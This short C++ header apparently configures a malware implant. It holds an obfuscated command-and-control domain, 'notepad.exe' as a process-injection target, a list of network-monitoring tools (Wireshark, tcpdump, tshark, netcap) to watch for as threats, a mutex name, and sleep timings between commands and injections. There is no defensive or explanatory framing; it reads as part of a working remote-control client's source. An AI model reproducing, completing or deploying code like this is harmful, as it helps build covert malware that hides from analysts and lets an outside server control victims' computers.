#pragma once
#include "obfuscate.h"
const std::string CNC_DOMAINS[] = {
	std::string(OBFUSCATE("aloncnc.com"))
};

#define PROCESS_NAME OBFUSCATE("notepad.exe")

const std::string THREAT_PROCESSES[] = {
	std::string(OBFUSCATE("wireshark.exe")),
	std::string(OBFUSCATE("tcpdump.exe")),
	std::string(OBFUSCATE("tshark.exe")),
	std::string(OBFUSCATE("netcap.exe"))
};
const char* MUTEX_NAME = "identity_mutex";

const size_t SLEEP_BETWEEN_COMMANDS = 10;

const size_t SLEEP_BETWEEN_INJECTIONS = 60;